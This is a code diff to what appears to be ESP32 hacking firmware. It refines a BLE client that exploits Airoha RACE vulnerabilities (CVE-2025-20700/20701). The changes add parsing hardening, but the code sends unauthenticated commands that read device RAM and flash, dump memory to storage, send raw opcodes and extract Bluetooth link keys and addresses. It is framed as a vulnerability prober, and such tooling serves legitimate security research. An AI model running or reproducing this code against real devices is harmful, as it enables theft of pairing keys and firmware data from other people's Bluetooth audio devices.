@@ -67,7 +67,7 @@ bool RaceClient::connect(const NimBLEAddress &address, uint32_t timeoutMs) {
     int err = 0;
     bool cancelled = false;
 
-    if (!gattConnectWithStrategies(address, &pClient, &err, &cancelled) || !pClient) {
+    if (!gattConnectWithStrategies(address, &pClient, &err, &cancelled, timeoutMs) || !pClient) {
         Serial.printf("[RACE] Connection failed: 0x%02X\n", err);
         return false;
     }
@@ -295,29 +295,60 @@ bool RaceClient::discoverRaceService() {
 
 void RaceClient::onNotify(NimBLERemoteCharacteristic *pChar, uint8_t *pData, size_t length, bool isNotify) {
     if (!pData || length == 0) return;
+    if (m_pRxChar && pChar != m_pRxChar) return;
 
     if (xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(50)) != pdTRUE) return;
 
-    // Append fragment
+    // Guard against unbounded RX buffer allocation / memory exhaustion
+    if (m_rxBuffer.size() + length > RACE_MAX_RX_BUFFER_SIZE) {
+        Serial.println(F("[RACE-WARN] RX buffer overflow, resetting buffer."));
+        m_rxBuffer.clear();
+    }
+
+    // Append incoming fragment
     m_rxBuffer.insert(m_rxBuffer.end(), pData, pData + length);
 
-    // Check if we have at least the header
-    if (m_rxBuffer.size() >= sizeof(RaceHeader)) {
-        RaceHeader *hdr = (RaceHeader *)m_rxBuffer.data();
-        m_expectedLength = hdr->length;
-
-        // Total packet size is 4 bytes (head + type + length) + expectedLength
-        size_t totalExpected = 4 + m_expectedLength;
-
-        if (m_rxBuffer.size() >= totalExpected) {
-            // Accept any valid RACE response frame (RACE_TYPE_RSP, RACE_TYPE_IND, etc.)
-            m_lastResponse.assign(m_rxBuffer.begin(), m_rxBuffer.begin() + totalExpected);
-            m_rxBuffer.erase(m_rxBuffer.begin(), m_rxBuffer.begin() + totalExpected);
-
-            if (m_expectingResponse && (m_expectedCmdId == 0 || hdr->cmdId == m_expectedCmdId)) {
-                m_expectingResponse = false;
-                xSemaphoreGive(m_syncSemaphore);
+    // Reassembly loop: consume all complete frames present in the buffer
+    while (m_rxBuffer.size() >= sizeof(RaceHeader)) {
+        // Validate magic header byte
+        uint8_t head = m_rxBuffer[0];
+        if (head != RACE_MAGIC_STD && head != RACE_MAGIC_EXT) {
+            // Search for next possible magic byte to resynchronize stream
+            size_t syncIdx = 1;
+            while (syncIdx < m_rxBuffer.size() &&
+                   m_rxBuffer[syncIdx] != RACE_MAGIC_STD &&
+                   m_rxBuffer[syncIdx] != RACE_MAGIC_EXT) {
+                syncIdx++;
             }
+            m_rxBuffer.erase(m_rxBuffer.begin(), m_rxBuffer.begin() + syncIdx);
+            continue;
+        }
+
+        const RaceHeader *hdr = reinterpret_cast<const RaceHeader *>(m_rxBuffer.data());
+        uint16_t frameLen = hdr->length;
+
+        // Header length must be at least 2 (command ID) and within max packet bounds
+        if (frameLen < 2 || frameLen > (RACE_MAX_RX_BUFFER_SIZE - 4)) {
+            // Discard single byte to find next valid frame
+            m_rxBuffer.erase(m_rxBuffer.begin());
+            continue;
+        }
+
+        // Total packet size = 4 bytes (head + type + length) + payload length (frameLen)
+        size_t totalExpected = 4 + frameLen;
+        if (m_rxBuffer.size() < totalExpected) {
+            // Incomplete frame, wait for further fragments
+            break;
+        }
+
+        // Complete frame received
+        m_lastResponse.assign(m_rxBuffer.begin(), m_rxBuffer.begin() + totalExpected);
+        uint16_t receivedCmdId = hdr->cmdId;
+        m_rxBuffer.erase(m_rxBuffer.begin(), m_rxBuffer.begin() + totalExpected);
+
+        if (m_expectingResponse && (m_expectedCmdId == 0 || receivedCmdId == m_expectedCmdId)) {
+            m_expectingResponse = false;
+            xSemaphoreGive(m_syncSemaphore);
         }
     }
 
@@ -384,7 +415,10 @@ bool RaceClient::sendCommandSync(uint8_t head, uint8_t type, uint16_t cmdId,
 
     if (!writeOk) {
         Serial.printf("[RACE-ERR] Failed to write cmd 0x%04X to TX char\n", cmdId);
-        m_expectingResponse = false;
+        if (xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+            m_expectingResponse = false;
+            xSemaphoreGive(m_packetMutex);
+        }
         return false;
     }
 
@@ -393,7 +427,10 @@ bool RaceClient::sendCommandSync(uint8_t head, uint8_t type, uint16_t cmdId,
     while (millis() - startMs < timeoutMs) {
         if (check(EscPress) || check(PrevPress)) {
             Serial.printf("[RACE-CANCEL] Cmd 0x%04X cancelled by user (ESC)\n", cmdId);
-            m_expectingResponse = false;
+            if (xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+                m_expectingResponse = false;
+                xSemaphoreGive(m_packetMutex);
+            }
             return false;
         }
 
@@ -409,13 +446,16 @@ bool RaceClient::sendCommandSync(uint8_t head, uint8_t type, uint16_t cmdId,
         }
     }
 
-    m_expectingResponse = false;
+    if (xSemaphoreTake(m_packetMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+        m_expectingResponse = false;
+        xSemaphoreGive(m_packetMutex);
+    }
     Serial.printf("[RACE-TIMEOUT] Timeout waiting for response to cmd 0x%04X (%u ms)\n", cmdId, (unsigned int)timeoutMs);
     return false;
 }
 
 //=============================================================================
-// High-Value Feature: Vulnerability Prober (CVE-2025-20700)
+// High-Value Feature: Vulnerability Prober (CVE-2025-20700 / CVE-2025-20701)
 //=============================================================================
 
 bool RaceClient::probeVulnerability(RaceVulnerabilityReport &report,
@@ -429,70 +469,111 @@ bool RaceClient::probeVulnerability(RaceVulnerabilityReport &report,
     if (!isConnected()) {
         report.raceOverBle = RACE_VULN_NOT_APPLICABLE;
         report.cve2025_20700 = RACE_VULN_NOT_APPLICABLE;
+        report.cve2025_20701 = RACE_VULN_NOT_APPLICABLE;
         report.details = "Device not connected or no RACE service";
         return false;
     }
 
     report.raceOverBle = RACE_VULN_VULNERABLE;
-    Serial.println(F("[RACE-AUDIT] Starting CVE-2025-20700 Unauthenticated Access Audit..."));
+    Serial.println(F("[RACE-AUDIT] Starting CVE-2025-20700 & CVE-2025-20701 Audit..."));
+
+    bool unauthGattOk = false;
+    bool explicitAuthReject = false;
 
     // Probe 1: Query Build Version (0x1E08)
     if (progressCb) progressCb("[1/4] Probe Build (0x1E08)...");
     Serial.println(F("[RACE-AUDIT] [Probe 1/4] Querying Build Version (0x1E08)..."));
     std::vector<uint8_t> rsp;
-    bool probeOk = sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 1500);
+    if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 1500)) {
+        if (rsp.size() > sizeof(RaceHeader)) {
+            uint8_t rc = rsp[sizeof(RaceHeader)];
+            if (rc == 0 || (rc >= 32 && rc <= 126)) {
+                unauthGattOk = true;
+            } else {
+                explicitAuthReject = true;
+            }
+        }
+    }
 
     // Probe 2: Query SDK Version (0x0301)
-    if (!probeOk) {
+    if (!unauthGattOk) {
         if (check(EscPress) || check(PrevPress)) {
             report.details = "Audit cancelled by user";
             return false;
         }
         if (progressCb) progressCb("[2/4] Probe SDK (0x0301)...");
         Serial.println(F("[RACE-AUDIT] [Probe 2/4] Querying SDK Version (0x0301)..."));
-        probeOk = sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 1500);
+        rsp.clear();
+        if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_READ_SDK_VERSION, nullptr, 0, rsp, 1500)) {
+            if (rsp.size() > sizeof(RaceHeader)) {
+                uint8_t rc = rsp[sizeof(RaceHeader)];
+                if (rc == 0 || (rc >= 32 && rc <= 126)) {
+                    unauthGattOk = true;
+                } else {
+                    explicitAuthReject = true;
+                }
+            }
+        }
     }
 
     // Probe 3: Query BD_ADDR (0x0CD5)
-    if (!probeOk) {
+    if (!unauthGattOk) {
         if (check(EscPress) || check(PrevPress)) {
             report.details = "Audit cancelled by user";
             return false;
         }
         if (progressCb) progressCb("[3/4] Probe BD_ADDR (0x0CD5)...");
         Serial.println(F("[RACE-AUDIT] [Probe 3/4] Querying Classic BD_ADDR (0x0CD5)..."));
-        probeOk = sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 1500);
-    }
-
-    // Probe 4: RAM Read at 0x14238C9C
-    if (!probeOk) {
-        if (check(EscPress) || check(PrevPress)) {
-            report.details = "Audit cancelled by user";
-            return false;
-        }
-        if (progressCb) progressCb("[4/4] Probe RAM (0x1680)...");
-        Serial.println(F("[RACE-AUDIT] [Probe 4/4] Querying RAM Address (0x1680)..."));
-        uint32_t ramVal = 0;
-        if (readRamWord(0x14238C9C, ramVal)) {
-            probeOk = true;
+        rsp.clear();
+        if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 1500)) {
+            if (rsp.size() >= sizeof(RaceHeader) + 2 + 6) {
+                if (rsp[sizeof(RaceHeader)] == 0) {
+                    unauthGattOk = true;
+                } else {
+                    explicitAuthReject = true;
+                }
+            }
         }
     }
 
+    // Probe 4: RAM Read at 0x14238C9C (CVE-2025-20701 / memory disclosure test)
     if (check(EscPress) || check(PrevPress)) {
         report.details = "Audit cancelled by user";
         return false;
     }
+    if (progressCb) progressCb("[4/4] Probe Memory Access (0x1680)...");
+    Serial.println(F("[RACE-AUDIT] [Probe 4/4] Querying RAM Address (0x1680)..."));
+    uint32_t ramVal = 0;
+    bool memAccessOk = readRamWord(0x14238C9C, ramVal);
+    if (!memAccessOk) {
+        // Try reading flash page 0
+        uint8_t pageBuf[256];
+        if (readFlashPage(0x00000000, pageBuf)) {
+            memAccessOk = true;
+        }
+    }
 
-    if (probeOk) {
+    if (memAccessOk) {
+        unauthGattOk = true;
+        report.cve2025_20701 = RACE_VULN_VULNERABLE;
+    } else {
+        report.cve2025_20701 = explicitAuthReject ? RACE_VULN_FIXED : RACE_VULN_UNKNOWN;
+    }
+
+    if (unauthGattOk) {
         report.cve2025_20700 = RACE_VULN_VULNERABLE;
         report.details = "RACE GATT service executes unauthenticated commands!";
         Serial.println(F("[RACE-AUDIT] >>> TARGET IS VULNERABLE TO CVE-2025-20700 <<<"));
-        return true;
+    } else if (explicitAuthReject) {
+        report.cve2025_20700 = RACE_VULN_FIXED;
+        report.details = "Commands rejected / pairing required by peer";
+        Serial.println(F("[RACE-AUDIT] Commands rejected or authentication required."));
+    } else {
+        report.cve2025_20700 = RACE_VULN_UNKNOWN;
+        report.details = "No response to RACE commands (may not be Airoha / timeout)";
+        Serial.println(F("[RACE-AUDIT] Target did not respond to RACE probes."));
     }
 
-    report.cve2025_20700 = RACE_VULN_FIXED;
-    report.details = "Commands rejected or require bonding/auth";
-    Serial.println(F("[RACE-AUDIT] Target commands rejected or authentication required."));
     return true;
 }
 
@@ -522,13 +603,13 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
     std::vector<uint8_t> rsp;
     if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BUILD_VERSION, nullptr, 0, rsp, 1500)) {
         if (rsp.size() > sizeof(RaceHeader)) {
-            // Check if there's a return code byte or raw string
             size_t strOffset = sizeof(RaceHeader);
             if (rsp[strOffset] == 0x00 && rsp.size() > sizeof(RaceHeader) + 1) {
                 strOffset += 1;
             }
             String bv = "";
             for (size_t i = strOffset; i < rsp.size(); i++) {
+                if (rsp[i] == 0) break; // Stop at NUL terminator
                 if (rsp[i] >= 32 && rsp[i] <= 126) bv += (char)rsp[i];
             }
             bv.trim();
@@ -550,6 +631,7 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
             }
             String sdk = "";
             for (size_t i = strOffset; i < rsp.size(); i++) {
+                if (rsp[i] == 0) break; // Stop at NUL terminator
                 if (rsp[i] >= 32 && rsp[i] <= 126) sdk += (char)rsp[i];
             }
             sdk.trim();
@@ -566,7 +648,7 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
     if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_BD_ADDRESS, nullptr, 0, rsp, 1500)) {
         // Preamble: return_code (1B) + agent_or_partner (1B) + bd_addr (6B, LE reversed)
         size_t addrOffset = sizeof(RaceHeader) + 2;
-        if (rsp.size() >= addrOffset + 6) {
+        if (rsp.size() >= addrOffset + 6 && rsp[sizeof(RaceHeader)] == 0) {
             char macBuf[24];
             snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
                      rsp[addrOffset + 5], rsp[addrOffset + 4], rsp[addrOffset + 3],
@@ -584,7 +666,7 @@ bool RaceClient::fetchDeviceInfo(RaceDeviceInfo &info,
     if (sendCommandSync(RACE_MAGIC_STD, RACE_TYPE_REQ, RACE_CMD_GET_LINK_KEY, nullptr, 0, rsp, 1500)) {
         // Preamble: return_code (1B) + num_of_devices (1B) + reserved (1B)
         size_t pOffset = sizeof(RaceHeader);
-        if (rsp.size() >= pOffset + 3) {
+        if (rsp.size() >= pOffset + 3 && rsp[pOffset] == 0) {
             uint8_t numDevs = rsp[pOffset + 1];
             info.linkKeyCount = numDevs;
             size_t recOffset = pOffset + 3;
@@ -714,6 +796,18 @@ bool RaceClient::readRamWord(uint32_t address, uint32_t &outWord) {
     uint8_t retCode = rsp[sizeof(RaceHeader)];
     if (retCode != 0) return false;
 
+    // Validate echoed read address
+    size_t addrOffset = sizeof(RaceHeader) + 3;
+    uint32_t echoedAddr = (uint32_t)rsp[addrOffset] |
+                          ((uint32_t)rsp[addrOffset + 1] << 8) |
+                          ((uint32_t)rsp[addrOffset + 2] << 16) |
+                          ((uint32_t)rsp[addrOffset + 3] << 24);
+    if (echoedAddr != address) {
+        Serial.printf("[RACE-ERR] RAM read address mismatch: expected 0x%08X, got 0x%08X\n",
+                      (unsigned int)address, (unsigned int)echoedAddr);
+        return false;
+    }
+
     size_t dataOffset = sizeof(RaceHeader) + 7;
     outWord = (uint32_t)rsp[dataOffset] |
               ((uint32_t)rsp[dataOffset + 1] << 8) |
@@ -728,6 +822,11 @@ bool RaceClient::readRam(uint32_t address, size_t length, std::vector<uint8_t> &
 {
     outData.clear();
     if (!isConnected() || length == 0) return false;
+
+    // Cap maximum read size to prevent resource exhaustion
+    if (length > RACE_MAX_RAM_READ_SIZE) {
+        length = RACE_MAX_RAM_READ_SIZE;
+    }
 
     // Align length to 4-byte words
     size_t totalWords = (length + 3) / 4;
@@ -788,6 +887,18 @@ bool RaceClient::readFlashPage(uint32_t address, uint8_t *outPage256, uint8_t st
     uint8_t retCode = rsp[sizeof(RaceHeader)];
     if (retCode != 0) return false;
 
+    // Validate echoed read address
+    size_t addrOffset = sizeof(RaceHeader) + 4;
+    uint32_t echoedAddr = (uint32_t)rsp[addrOffset] |
+                          ((uint32_t)rsp[addrOffset + 1] << 8) |
+                          ((uint32_t)rsp[addrOffset + 2] << 16) |
+                          ((uint32_t)rsp[addrOffset + 3] << 24);
+    if (echoedAddr != address) {
+        Serial.printf("[RACE-ERR] Flash read address mismatch: expected 0x%08X, got 0x%08X\n",
+                      (unsigned int)address, (unsigned int)echoedAddr);
+        return false;
+    }
+
     size_t dataOffset = sizeof(RaceHeader) + preambleSize;
     memcpy(outPage256, rsp.data() + dataOffset, 256);
     return true;
@@ -798,6 +909,11 @@ bool RaceClient::readFlash(uint32_t address, size_t length, std::vector<uint8_t>
 {
     outData.clear();
     if (!isConnected() || length == 0) return false;
+
+    // Cap maximum flash read size
+    if (length > RACE_MAX_FLASH_READ_SIZE) {
+        length = RACE_MAX_FLASH_READ_SIZE;
+    }
 
     size_t numPages = (length + 255) / 256;
     outData.resize(numPages * 256);
@@ -855,6 +971,12 @@ bool RaceClient::getPartitionTable(std::vector<RacePartitionEntry> &partitions) 
             break;
         }
 
+        // Validate partition entry sanity bounds
+        if (addr >= 0x20000000 || len >= 0x20000000 || ptype > 16) {
+            Serial.printf("[RACE-PT] Invalid partition entry found at offset 0x%04X, stopping parse\n", (unsigned int)offset);
+            break;
+        }
+
         RacePartitionEntry p;
         p.address = addr;
         p.length = len;
@@ -894,6 +1016,12 @@ bool RaceClient::dumpMemoryToStorage(bool isRam, uint32_t address, size_t size,
     outSavedPath = "";
     if (!isConnected() || size == 0) return false;
 
+    // Enforce safety ceiling on dump size
+    size_t maxSize = isRam ? RACE_MAX_RAM_READ_SIZE : RACE_MAX_FLASH_READ_SIZE;
+    if (size > maxSize) {
+        size = maxSize;
+    }
+
     // Check SD card first, fallback to LittleFS
     bool useSd = sdcardMounted;
     if (!useSd) useSd = setupSdCard(2);
@@ -912,6 +1040,11 @@ bool RaceClient::dumpMemoryToStorage(bool isRam, uint32_t address, size_t size,
     String localFsPath = String(fName);
     if (useSd && localFsPath.startsWith("/sd")) {
         localFsPath = localFsPath.substring(3);
+    }
+
+    // Ensure existing file is removed before writing to avoid appending corrupt dumps (RACE-09)
+    if (fs->exists(localFsPath)) {
+        fs->remove(localFsPath);
     }
 
     File file = fs->open(localFsPath, FILE_WRITE);
@@ -1014,17 +1147,19 @@ static void showVulnReportUi(const RaceVulnerabilityReport &report, const RaceDe
     } else if (report.cve2025_20700 == RACE_VULN_FIXED) {
         area.addLine("STATUS: FIXED / AUTH REQUIRED");
     } else {
-        area.addLine("STATUS: NOT APPLICABLE");
+        area.addLine("STATUS: NOT APPLICABLE / TIMEOUT");
     }
     area.addLine("");
 
     area.addLine("[CVE-2025-20701: Memory Access]");
-    if (report.cve2025_20700 == RACE_VULN_VULNERABLE) {
-        area.addLine("STATUS: POTENTIALLY EXPOSED");
+    if (report.cve2025_20701 == RACE_VULN_VULNERABLE) {
+        area.addLine("STATUS: VULNERABLE / EXPOSED");
         area.addLine("Direct RAM/Flash read commands");
-        area.addLine("reachable via BLE transport.");
+        area.addLine("execute via unauthenticated BLE.");
+    } else if (report.cve2025_20701 == RACE_VULN_FIXED) {
+        area.addLine("STATUS: FIXED / PROTECTED");
     } else {
-        area.addLine("STATUS: SAFE / GATED");
+        area.addLine("STATUS: NOT APPLICABLE / UNKNOWN");
     }
     area.addLine("");
 
@@ -1321,27 +1456,7 @@ static void runDeviceInfoUi(RaceClient &client, const String &devName) {
     showDeviceInfoUi(info);
 }
 
-void launchRaceForDevice(NimBLEClient *pClient, const String &devName, const NimBLEAddress &address) {
-    if (!pClient || !pClient->isConnected()) {
-        displayError("Device not connected", true);
-        return;
-    }
-
-    RaceClient client;
-    drawMainBorder(true);
-    tft.setTextSize(FP);
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.drawString("Target: " + gattFitText(devName, tftWidth - 20), BORDER_PAD_X, BORDER_PAD_Y + 16);
-    tft.drawString("Probing RACE GATT service...", BORDER_PAD_X, BORDER_PAD_Y + 28);
-
-    if (!client.attachClient(pClient)) {
-        displayError("No RACE service on device", true);
-        return;
-    }
-
-    displaySuccess("RACE Connected!", false);
-    delay(300);
-
+static void runRaceOperationsMenu(RaceClient &client, const String &devName) {
     struct RaceMenuItem {
         String label;
         std::function<void()> action;
@@ -1375,7 +1490,7 @@ void launchRaceForDevice(NimBLEClient *pClient, const String &devName, const Nim
         }});
 
         items.push_back({"7. Disconnect / Back", [&]() {
-            // Return back
+            client.disconnect();
         }});
 
         auto drawer = [&items](int idx, int x, int y, int w, bool sel) {
@@ -1387,11 +1502,38 @@ void launchRaceForDevice(NimBLEClient *pClient, const String &devName, const Nim
         };
 
         int chosen = gattListLoop("", items.size(), "SEL choose  ESC back", drawer, &menuCursor);
-        if (chosen < 0 || chosen >= (int)items.size() - 1) break;
+        if (chosen < 0 || chosen >= (int)items.size() - 1) {
+            client.disconnect();
+            break;
+        }
         if (items[chosen].action) {
             items[chosen].action();
         }
     }
+}
+
+void launchRaceForDevice(NimBLEClient *pClient, const String &devName, const NimBLEAddress &address) {
+    if (!pClient || !pClient->isConnected()) {
+        displayError("Device not connected", true);
+        return;
+    }
+
+    RaceClient client;
+    drawMainBorder(true);
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.drawString("Target: " + gattFitText(devName, tftWidth - 20), BORDER_PAD_X, BORDER_PAD_Y + 16);
+    tft.drawString("Probing RACE GATT service...", BORDER_PAD_X, BORDER_PAD_Y + 28);
+
+    if (!client.attachClient(pClient)) {
+        displayError("No RACE service on device", true);
+        return;
+    }
+
+    displaySuccess("RACE Connected!", false);
+    delay(300);
+
+    runRaceOperationsMenu(client, devName);
 }
 
 //=============================================================================
@@ -1409,6 +1551,7 @@ void raceMainMenu() {
     NimBLEScan *pScan = NimBLEDevice::getScan();
     if (!pScan) {
         displayError("Failed to get scan engine", true);
+        BLEStateManager::deinitBLE(true);
         return;
     }
 
@@ -1456,6 +1599,7 @@ void raceMainMenu() {
 
     if (devList.empty()) {
         displayWarning("No devices found", true);
+        BLEStateManager::deinitBLE(true);
         return;
     }
 
@@ -1536,59 +1680,7 @@ void raceMainMenu() {
         displaySuccess("RACE Connected!", false);
         delay(300);
 
-        struct RaceMenuItem {
-            String label;
-            std::function<void()> action;
-        };
-
-        int raceOpCursor = 0;
-        while (client.isConnected()) {
-            std::vector<RaceMenuItem> raceOps;
-            raceOps.push_back({"1. Quick Vuln Check (CVE)", [&]() {
-                runVulnCheckUi(client, targetDev.name);
-            }});
-
-            raceOps.push_back({"2. Device Info & Keys", [&]() {
-                runDeviceInfoUi(client, targetDev.name);
-            }});
-
-            raceOps.push_back({"3. Live Media Info", [&]() {
-                runMediaInfoUi(client);
-            }});
-
-            raceOps.push_back({"4. RAM Memory Inspector", [&]() {
-                runRamInspectorUi(client);
-            }});
-
-            raceOps.push_back({"5. Flash Partition Table", [&]() {
-                runPartitionTableUi(client);
-            }});
-
-            raceOps.push_back({"6. Send Raw RACE Opcode", [&]() {
-                runCustomRawCmdUi(client);
-            }});
-
-            raceOps.push_back({"7. Disconnect & Back", [&]() {
-                client.disconnect();
-            }});
-
-            auto drawer = [&raceOps](int idx, int x, int y, int w, bool sel) {
-                uint16_t fg = sel ? bruceConfig.bgColor : bruceConfig.priColor;
-                uint16_t bg = sel ? bruceConfig.priColor : bruceConfig.bgColor;
-                tft.setTextColor(fg, bg);
-                tft.setTextSize(FP);
-                tft.drawString(gattFitText(raceOps[idx].label, w), x, y, 1);
-            };
-
-            int chosen = gattListLoop("", raceOps.size(), "SEL choose  ESC back", drawer, &raceOpCursor);
-            if (chosen < 0 || chosen >= (int)raceOps.size() - 1) {
-                client.disconnect();
-                break;
-            }
-            if (raceOps[chosen].action) {
-                raceOps[chosen].action();
-            }
-        }
+        runRaceOperationsMenu(client, targetDev.name);
 
         client.disconnect();
         if (pClient) {
@@ -1597,6 +1689,8 @@ void raceMainMenu() {
             pClient = nullptr;
         }
     }
+
+    BLEStateManager::deinitBLE(true);
 }
 
 //=============================================================================
@@ -1640,7 +1734,10 @@ bool raceCli(const String &macStr, uint8_t addrType, const String &subCmd,
         serialDevice->println("========================================");
         serialDevice->printf("CVE-2025-20700 (GATT Auth): %s\n",
                              (rep.cve2025_20700 == RACE_VULN_VULNERABLE) ? "VULNERABLE (Unauthenticated commands accepted!)" :
-                             (rep.cve2025_20700 == RACE_VULN_FIXED) ? "FIXED / PROTECTED" : "NOT APPLICABLE");
+                             (rep.cve2025_20700 == RACE_VULN_FIXED) ? "FIXED / PROTECTED" : "NOT APPLICABLE / TIMEOUT");
+        serialDevice->printf("CVE-2025-20701 (Memory Access): %s\n",
+                             (rep.cve2025_20701 == RACE_VULN_VULNERABLE) ? "VULNERABLE (Direct RAM/Flash read allowed!)" :
+                             (rep.cve2025_20701 == RACE_VULN_FIXED) ? "FIXED / PROTECTED" : "NOT APPLICABLE / UNKNOWN");
         serialDevice->printf("Details: %s\n", rep.details.c_str());
         serialDevice->printf("Classic BD_ADDR: %s\n", info.classicBdAddr.isEmpty() ? "N/A" : info.classicBdAddr.c_str());
         serialDevice->printf("SDK Info:        %s\n", info.sdkInfo.isEmpty() ? "N/A" : info.sdkInfo.c_str());
